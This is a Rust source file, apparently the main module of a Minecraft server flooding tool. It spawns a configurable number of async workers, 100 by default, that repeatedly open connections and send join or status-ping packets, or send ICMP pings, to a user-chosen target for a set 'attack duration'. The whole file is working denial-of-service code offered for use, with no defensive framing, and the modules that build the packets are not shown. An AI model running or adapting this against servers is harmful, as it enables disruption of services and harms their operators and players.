use std::net::SocketAddrV4;
use std::process::exit;
use std::time::Instant;
use std::{sync::atomic::AtomicU64, time::Duration};
use std::{sync::atomic::Ordering, sync::Arc};

use clap::Parser;
use ez_colorize::ColorizeDisplay;
use tokio::time::sleep;

use crate::counter::write_stats;
use crate::duration::parse_duration_as_secs;
use crate::method_icmp_ping::send_icmp_ping;
use crate::method_join::send_join;
use crate::method_ping::send_ping;
use crate::methods::{method_to_string, parse_method, AttackMethod};
use crate::resolver::{parse_hostname, parse_target};
mod counter;
mod mc_packet_utils;
mod method_icmp_ping;
mod method_join;
mod method_ping;
mod methods;
mod resolver;
#[derive(Debug, Parser)]
struct Flags {
    ///IP or Domain of the target server. You can also use port here with ":"
    target: String,
    /// Number of workers.
    #[arg(short, long, default_value_t = 100)]
    workers: u32,
    /// Attack duration. Available formats: seconds, minutes, hours.
    #[arg(short, long, default_value_t = String::from("1m"))]
    duration: String,
    /// Attack method. Available methods: join, ping and icmp.
    #[arg(short, long, default_value_t = String::from("ping"))]
    method: String,
}
mod duration;
#[tokio::main]
async fn main() {
    let args = Flags::parse();
    let start_time = Instant::now();
    let (duration_secs, parsed_duration) = parse_duration_as_secs(args.duration);
    let target = parse_target(args.target.as_str(), 25565).await.unwrap();
    let hostname = Arc::new(parse_hostname(args.target.as_str()));
    let method = Arc::new(parse_method(args.method.as_str()));

    println!("Running stress for {}", parsed_duration.red());
    println!(
        "Method: {}",
        method_to_string(parse_method(args.method.as_str())).yellow()
    );
    println!(
        "Resolved target {} {} {}",
        args.target.green(),
        String::from("=").yellow(),
        target.cyan(),
    );
    print!("\n\n\n\n\n");
    let cps = Arc::new(AtomicU64::new(0));
    let failures = Arc::new(AtomicU64::new(0));
    unsafe {
        tokio::spawn(write_stats(cps.clone(), failures.clone()));
    }

    let workers = args.workers;

    for _ in 0..workers {
        let hostname = hostname.clone();
        let connections = cps.clone();
        let failures = failures.clone();
        let method = method.clone();
        tokio::spawn(async move {
            worker_loop(connections, failures, &target, hostname.as_str(), method).await;
        });
    }
    tokio::spawn(async move {
        loop {
            sleep(Duration::from_millis(20)).await;
            if start_time.elapsed().as_secs() > duration_secs {
                exit(0);
            }
        }
    });

    tokio::signal::ctrl_c()
        .await
        .expect("Couldn't wait for ctrl c");
}

async fn worker_loop(
    cps: Arc<AtomicU64>,
    failures: Arc<AtomicU64>,
    target: &SocketAddrV4,
    hostname: &str,
    method: Arc<AttackMethod>,
) {
    loop {
        if *method == AttackMethod::IcmpPing {
            send_icmp_ping(target.ip(), cps.clone(), failures.clone()).await;
            continue;
        }
        let mut stream = match tokio::net::TcpStream::connect(target).await {
            Ok(value) => value,
            Err(_) => {
                failures.fetch_add(1, Ordering::Relaxed);
                continue;
            }
        };
        match *method {
            AttackMethod::Join => send_join(&mut stream, &target.port(), hostname).await,
            AttackMethod::Ping => send_ping(&mut stream, &target.port(), hostname).await,
            AttackMethod::IcmpPing => { /*impossible code logic*/ }
        };
        cps.fetch_add(1, Ordering::Relaxed);
    }
}
